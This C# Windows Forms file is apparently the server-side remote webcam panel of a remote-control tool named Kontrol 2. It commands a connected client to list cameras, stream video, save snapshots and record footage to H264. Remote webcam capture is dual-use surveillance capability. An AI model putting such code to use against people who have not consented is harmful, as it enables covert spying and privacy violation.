﻿using FFMediaToolkit;
using FFMediaToolkit.Encoding;
using FFMediaToolkit.Graphics;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Kontrol_2_Server
{
	public partial class RemoteCamForm : Form
	{
		public int clientId;
		public bool wcStream;
		private string spath = null;
		private string rpath = null;
		private List<byte[]> imagesList = new List<byte[]>();
		public RemoteCamForm()
		{
			InitializeComponent(); 
		}

		private void RemoteCamForm_Load(object sender, EventArgs e)
		{
			new MainForm().SendCommand("remote_webcam\ncapture_devices", clientId);
			new MainForm().SendCommand("remote_webcam\ndevice_resolutions\n0", clientId);
			//new MainForm().SendCommand("remote_webcam\nbegin_stream", clientId);
		}
		public void listDevices(string devices)
		{
			string[] xsplit = devices.Split('&');
			if (this.InvokeRequired)
			{
				devicesCombo.Invoke(new MethodInvoker(delegate
				{
					foreach (string device in xsplit)
					{
						devicesCombo.Items.Add(device);
					}
					devicesCombo.SelectedIndex = 0;
				}));
			}
			else
			{
				foreach (string device in xsplit)
				{
					devicesCombo.Items.Add(device);
				}
				devicesCombo.SelectedIndex = 0;
			}
		}
		public void listResolutions(string resolutions)
		{
			string[] xsplit = resolutions.Split('&');
			if (this.InvokeRequired)
			{
				devicesCombo.Invoke(new MethodInvoker(delegate
				{
					resCombo.Items.Clear();
					foreach (string res in xsplit)
					{
						resCombo.Items.Add(res);
					}
					resCombo.SelectedIndex = 0;
				}));
			}
			else
			{
				resCombo.Items.Clear();
				foreach (string res in xsplit)
				{
					resCombo.Items.Add(res);
				}
				resCombo.SelectedIndex = 0;
			}
		}
		public void displayImage(Bitmap image)
		{
			if (wcStream)
			{
				if (this.InvokeRequired)
				{
					videoBox.Invoke(new MethodInvoker(delegate
					{
						videoBox.Image = image;
						if (recButton.Text == "Stop Recording")
						{
							ImageConverter converter = new ImageConverter();
							imagesList.Add((byte[])converter.ConvertTo(videoBox.Image, typeof(byte[])));
						}
					}));
				}
				else
				{
					videoBox.Image = image;
					if (recButton.Text == "Stop Recording")
					{
						ImageConverter converter = new ImageConverter();
						imagesList.Add((byte[])converter.ConvertTo(videoBox.Image, typeof(byte[])));
					}
				}
			}
		}

		private void startButton_Click(object sender, EventArgs e)
		{
			if (startButton.Text.ToLower() == "start")
			{
				new MainForm().SendCommand("remote_webcam\nbegin_stream\n" + devicesCombo.SelectedIndex + "&" + resCombo.SelectedIndex, clientId);
				resCombo.Enabled = false;
				devicesCombo.Enabled = false;
				recButton.Enabled = true;
				button1.Enabled = true;
				startButton.Text = "Stop";
			}
			else
			{
				new MainForm().SendCommand("remote_webcam\nend_stream", clientId);
				resCombo.Enabled = true;
				devicesCombo.Enabled = true;
				recButton.Enabled = false;
				button1.Enabled = false;
				startButton.Text = "Start";
				videoBox.Image = null;
			}
		}

		private void button1_Click(object sender, EventArgs e)
		{
			if (spath == null)
			{
				SaveFileDialog sfd = new SaveFileDialog();
				if (sfd.ShowDialog() == DialogResult.OK)
				{
					spath = sfd.FileName;
					videoBox.Image.Save(spath, ImageFormat.Jpeg);
				}
			}
			else
			{
				videoBox.Image.Save(spath, ImageFormat.Jpeg);
			}
		}

		private void RemoteCamForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			MainForm.rcf = new RemoteCamForm();
			if(wcStream)
				new MainForm().SendCommand("remote_webcam\nend_stream", clientId);
		}

		private void devicesCombo_SelectedIndexChanged(object sender, EventArgs e)
		{
			new MainForm().SendCommand("remote_webcam\ndevice_resolutions\n" + devicesCombo.SelectedIndex, clientId);
		}

		private void recButton_Click(object sender, EventArgs e)
		{
			if (recButton.Text == "Record")
			{
				if (rpath == null)
				{
					SaveFileDialog fd = new SaveFileDialog();
					if (fd.ShowDialog() == DialogResult.OK)
					{
						rpath = fd.FileName;
						recButton.Text = "Stop Recording";
					}
				}
			}
			else
			{
				FFmpegLoader.FFmpegPath = @".\data\ffmpeg-gpl-shared\bin";
				recButton.Text = "Record";
				var settings = new VideoEncoderSettings(width: 960, height: 544, framerate: 30, codec: VideoCodec.H264);
				settings.EncoderPreset = EncoderPreset.Fast;
				settings.CRF = 17;
				var file = MediaBuilder.CreateContainer(rpath).WithVideo(settings).Create();
				foreach (byte[] imageBytes in imagesList)
				{
					var memStream = new MemoryStream(imageBytes);
					var bitmap = (Bitmap)Bitmap.FromStream(memStream);
					var rect = new System.Drawing.Rectangle(System.Drawing.Point.Empty, bitmap.Size);
					var bitLock = bitmap.LockBits(rect, ImageLockMode.ReadOnly, PixelFormat.Format24bppRgb);
					var bitmapData = ImageData.FromPointer(bitLock.Scan0, ImagePixelFormat.Bgr24, bitmap.Size);
					file.Video.AddFrame(bitmapData); // Encode the frame
					bitmap.UnlockBits(bitLock);
				}
				file.Dispose();
			}
		}
		private void videoEncoder_Tick(object sender, EventArgs e)
		{

		}
	}
}